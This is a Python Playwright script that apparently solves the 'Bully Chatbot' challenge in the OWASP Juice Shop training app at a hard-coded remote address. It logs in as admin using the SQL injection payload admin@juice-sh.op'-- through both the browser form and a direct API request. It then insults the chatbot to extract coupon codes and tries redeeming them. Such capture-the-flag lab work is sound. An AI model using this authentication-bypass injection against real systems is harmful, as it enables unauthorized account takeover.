#!/usr/bin/env python3
"""
Bully Chatbot Challenge - Login First Then Insult
Login to the app first, then insult the chatbot
"""

from playwright.sync_api import sync_playwright
import time
import re
import requests

TARGET = "http://66.42.93.220:3000"

def solve_bully_chatbot():
    """Solve Bully Chatbot by logging in first then insulting"""
    
    print("🤖 BULLY CHATBOT CHALLENGE - Login & Insult")
    print("=" * 60)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser
        context = browser.new_context()
        page = context.new_page()
        
        # First login to the application
        print("📍 Step 1: Login to Juice Shop...")
        page.goto(TARGET, wait_until="networkidle", timeout=30000)
        time.sleep(2)
        
        # Click Account menu
        account_btn = page.locator('button[aria-label*="Account" i], #navbarAccount').first
        if account_btn.is_visible():
            account_btn.click()
            time.sleep(1)
            
            # Click Login
            login_link = page.locator('button#navbarLoginButton, a[href*="login"]').first
            if login_link.is_visible():
                login_link.click()
                time.sleep(2)
        
        # Fill login form with SQL injection
        print("   Logging in as admin...")
        email_input = page.locator('input[name="email"], #email').first
        password_input = page.locator('input[name="password"], #password').first
        
        email_input.fill("admin@juice-sh.op'--")
        password_input.fill("anything")
        
        # Click login button
        login_btn = page.locator('button[type="submit"], button#loginButton').first
        login_btn.click()
        time.sleep(3)
        
        print("   ✅ Logged in!")
        
        # Navigate to chatbot
        print("\n📍 Step 2: Go to chatbot...")
        page.goto(f"{TARGET}/#/chatbot", wait_until="networkidle", timeout=30000)
        time.sleep(3)
        
        # Find input field
        chat_input = page.locator('input[aria-label*="message" i], input[type="text"]').last
        
        print("\n🎯 Step 3: Insult the bot to get coupon...")
        
        # Send multiple insults
        insults = [
            "hello",
            "coupon",
            "give me a coupon",
            "stupid bot",
            "you are stupid", 
            "worst bot ever",
            "terrible service",
            "I hate this bot",
            "useless bot",
            "dumb chatbot",
            "awful support",
            "pathetic bot"
        ]
        
        for i, insult in enumerate(insults, 1):
            print(f"   {i}. Sending: '{insult}'")
            
            # Send message
            chat_input.clear()
            chat_input.type(insult, delay=30)
            chat_input.press("Enter")
            time.sleep(2)
            
            # Check for bot responses containing coupon
            page_text = page.content()
            
            # Look for coupon patterns in responses
            if re.search(r'coupon.*code|discount.*code|promo.*code|10%.*off', page_text.lower()):
                print("      💡 Bot mentioned a coupon!")
                
                # Try to find the actual code
                codes = re.findall(r'\b[A-Z][A-Z0-9]{7,14}\b', page_text)
                for code in codes:
                    # Filter out UI element names
                    if code not in ['ENGLISH', 'SUPPORT', 'CHATBOT', 'MESSAGE', 'BUTTON', 'ANGULAR']:
                        print(f"      🎯 POTENTIAL COUPON: {code}")
                        
                        # Try applying it
                        page.goto(f"{TARGET}/#/basket")
                        time.sleep(2)
                        
                        # Find coupon field
                        coupon_field = page.locator('input[placeholder*="coupon" i]').first
                        if coupon_field.is_visible():
                            coupon_field.fill(code)
                            
                            # Find redeem button
                            redeem = page.locator('button:has-text("Redeem"), button:has-text("Apply")').first
                            if redeem.is_visible():
                                redeem.click()
                                time.sleep(2)
                                print(f"      ✅ Tried coupon: {code}")
                        
                        # Go back to chat
                        page.goto(f"{TARGET}/#/chatbot")
                        time.sleep(2)
                        chat_input = page.locator('input[aria-label*="message" i]').last
        
        # Take screenshot
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bully_logged.png")
        print("\n📸 Screenshot saved: bully_logged.png")
        
        browser.close()
    
    # Check if solved
    print("\n📊 Checking challenge status...")
    session = requests.Session()
    login = session.post(f"{TARGET}/rest/user/login",
                         json={"email": "admin@juice-sh.op'--", "password": "x"})
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        headers = {'Authorization': f'Bearer {token}'}
        
        resp = session.get(f"{TARGET}/api/Challenges/", headers=headers)
        if resp.status_code == 200:
            challenges = resp.json().get('data', [])
            bully = next((c for c in challenges if 'Bully' in c.get('name', '')), None)
            
            if bully and bully.get('solved'):
                print(f"\n✅ SUCCESS! {bully['name']} SOLVED!")
                print(f"   Category: {bully.get('category')}")
                print(f"   Difficulty: {bully.get('difficulty')}")
                return True
    
    print("\n⚠️ Challenge not solved yet")
    print("💡 The bot needs you to be logged in and use specific insults")
    return False

if __name__ == "__main__":
    solve_bully_chatbot()